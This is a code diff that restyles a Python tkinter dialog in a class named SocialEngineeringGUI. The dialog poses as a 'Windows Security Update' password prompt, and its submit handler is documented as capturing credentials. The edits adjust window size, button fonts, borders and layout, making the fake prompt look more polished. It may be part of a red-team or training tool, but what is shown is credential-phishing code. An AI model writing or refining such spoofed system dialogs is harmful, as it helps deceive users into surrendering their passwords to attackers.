@@ -161,7 +161,7 @@ class SocialEngineeringGUI:
         """Build the tkinter password dialog."""
         self.root = tk.Tk()
         self.root.title("Windows Security Update")
-        self.root.geometry("420x480")
+        self.root.geometry("420x400")
         self.root.resizable(False, False)
         self.root.configure(bg="#f0f0f0")
         self.root.protocol("WM_DELETE_WINDOW", self.on_close)
@@ -254,35 +254,35 @@ class SocialEngineeringGUI:
 
         # Buttons
         btn_frame = tk.Frame(self.root, bg="#f0f0f0")
-        btn_frame.pack(fill="x", padx=30, pady=(10, 20))
+        btn_frame.pack(fill="x", padx=30, pady=(10, 15))
 
         tk.Button(
             btn_frame,
             text="UPDATE PASSWORD",
-            font=("Liberation Sans", 18, "bold"),
+            font=("Liberation Sans", 12, "bold"),
             bg="#0078d4",
             fg="#ffffff",
             activebackground="#005a9e",
             activeforeground="#ffffff",
             relief="solid",
-            bd=3,
+            bd=2,
             cursor="hand2",
             command=self.on_submit,
-        ).pack(fill="x", pady=(0, 10), ipady=8)
+        ).pack(side="left", fill="x", expand=True, padx=(0, 5), ipady=6)
 
         tk.Button(
             btn_frame,
             text="CANCEL",
-            font=("Liberation Sans", 18),
+            font=("Liberation Sans", 12),
             bg="#c8c8c8",
             fg="#000000",
             activebackground="#a0a0a0",
             activeforeground="#000000",
             relief="solid",
-            bd=3,
+            bd=2,
             cursor="hand2",
             command=self.on_close,
-        ).pack(fill="x", ipady=8)
+        ).pack(side="right", fill="x", expand=True, padx=(5, 0), ipady=6)
 
     def on_submit(self):
         """Handle form submission - captures credentials."""
